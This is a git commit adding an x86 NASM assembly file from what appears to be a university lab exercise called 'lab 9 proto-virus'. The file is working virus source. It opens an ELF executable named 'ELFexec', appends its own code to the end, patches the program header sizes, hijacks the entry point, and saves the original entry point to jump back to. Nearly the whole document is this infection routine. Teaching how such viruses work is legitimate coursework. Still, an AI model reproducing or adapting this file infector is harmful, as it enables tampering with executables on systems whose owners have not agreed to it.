1f233d30fdfcd537b70c7d25d7d6dbb00d5907a7
finder shahaf <finders@cs307row1-7.cs.bgu.ac.il>
2017-06-28 11:00:02 +0300

    task3 complete

---
+++ task3/skeleton.s
@@ -0,0 +1,175 @@
+%macro	syscall1 2
+	mov	ebx, %2
+	mov	eax, %1
+	int	0x80
+%endmacro
+
+%macro	syscall3 4
+	mov	edx, %4
+	mov	ecx, %3
+	mov	ebx, %2
+	mov	eax, %1
+	int	0x80
+%endmacro
+
+%macro  exit 1
+	syscall1 1, %1
+%endmacro
+
+%macro  write 3
+	syscall3 4, %1, %2, %3
+%endmacro
+
+%macro  read 3
+	syscall3 3, %1, %2, %3
+%endmacro
+
+%macro  open 3
+	syscall3 5, %1, %2, %3
+%endmacro
+
+%macro  lseek 3
+	syscall3 19, %1, %2, %3
+%endmacro
+
+%macro  close 1
+	syscall1 6, %1
+%endmacro
+
+%define	STK_RES	200
+%define	RDWR	2
+%define	SEEK_END 2
+%define SEEK_SET 0
+
+%define ENTRY		24
+%define PHDR_start	28
+%define	PHDR_size	32
+%define PHDR_memsize	20	
+%define PHDR_filesize	16
+%define	PHDR_offset	4
+%define	PHDR_vaddr	8
+
+%define fd 		ebp - 4
+
+global _start
+
+section .text
+align 16
+_start:	
+	push	ebp
+	mov		ebp, esp
+	sub		esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+	
+	call 	getpos
+
+getpos:
+	mov 	dword ecx, [esp]			; this operation is in TOS
+	
+	add 	ecx, OutStrOffset
+
+	write 	1, ecx, OutStrSz
+	
+	
+	mov 	dword ebx, [esp]
+	add 	ebx, FileNameOffset
+	open 	ebx, RDWR, 0777
+
+	cmp 	eax, 0
+	jle  	error
+	
+	mov 	dword [fd], eax
+
+	mov 	ecx, ebp
+	sub 	ecx, 8
+	read 	[fd], ecx, 4
+	cmp 	eax, 0
+	jle 	error
+	cmp 	dword [ebp - 8], 0x464C457F
+	jne 	error
+	
+	lseek 	[fd], 0, SEEK_END
+	mov 	[esp - 4], eax
+
+	mov 	ecx, [esp]
+	add 	ecx, startOffset
+	write 	[fd], ecx, virus_end - _start
+	
+	lseek 	[fd], 0, SEEK_SET		
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES
+	read 	[fd], ecx, 52
+	
+	lseek	[fd], 84, SEEK_SET
+	mov 	ecx,ebp
+	sub	 	ecx, 148
+	read 	[fd], ecx,32
+	
+	mov 	edx, ebp
+	sub 	edx, STK_RES
+	add 	edx, 52
+	mov 	dword eax,[edx + 4]		;move offset to eax
+	mov 	ebx, [esp - 4]
+	add 	ebx, virus_end - _start
+	sub 	ebx, eax
+	mov 	dword [edx + 16], ebx
+	mov 	dword [edx + 20], ebx
+	
+	lseek 	[fd], 84, SEEK_SET
+	mov 	ecx, ebp
+	sub 	ecx, 148
+	write 	[fd], ecx, 32	 ;write back to memory
+
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES - ENTRY
+	mov 	eax, [ecx]
+	mov 	[esp - 8], eax
+	
+	mov 	ebx, ebp
+	sub 	ebx, STK_RES
+	add 	ebx, 52
+	mov 	dword edx, [ebx + 8]	; get vaddress
+	mov 	eax, [ebx + 16]
+	add 	eax, edx
+	sub 	eax, virus_end - _start
+	mov 	[ecx], eax
+
+	lseek 	[fd], 0, SEEK_SET
+
+	mov 	ecx, ebp
+	sub 	ecx, STK_RES
+	write 	[fd], ecx, 52
+
+	lseek 	[fd], 0, SEEK_END
+	sub 	eax, 4
+	lseek 	[fd], eax, SEEK_SET
+	mov 	ecx, esp
+	sub 	ecx, 8
+	write 	[fd], ecx, 4
+
+VirusPreExit:
+	mov 	eax, [esp]
+	add 	eax, PEPOffset
+	jmp 	[eax]
+VirusExit:
+   	exit 0          	; Termination if all is OK and no previous code to jump to
+         	            ; (also an example for use of above macros)
+
+error:
+	mov 	ecx, [esp]
+	add 	ecx, FailstrOffset
+	write 	1, ecx, FailstrSz
+	jmp 	VirusPreExit
+
+FileNameOffset: equ $ - getpos
+FileName:		db "ELFexec", 0
+OutStrOffset: 	equ $ - getpos
+OutStr:			db "The lab 9 proto-virus strikes!", 10, 0
+OutStrSz: 		equ $ - OutStr
+FailstrOffset:	equ $ - getpos
+Failstr:        db "perhaps not", 10 , 0
+FailstrSz: 		equ $ - Failstr
+startOffset: 	equ _start - getpos
+PEPOffset: 		equ $ - getpos
+PreviousEntryPoint: dd VirusExit
+virus_end:
+
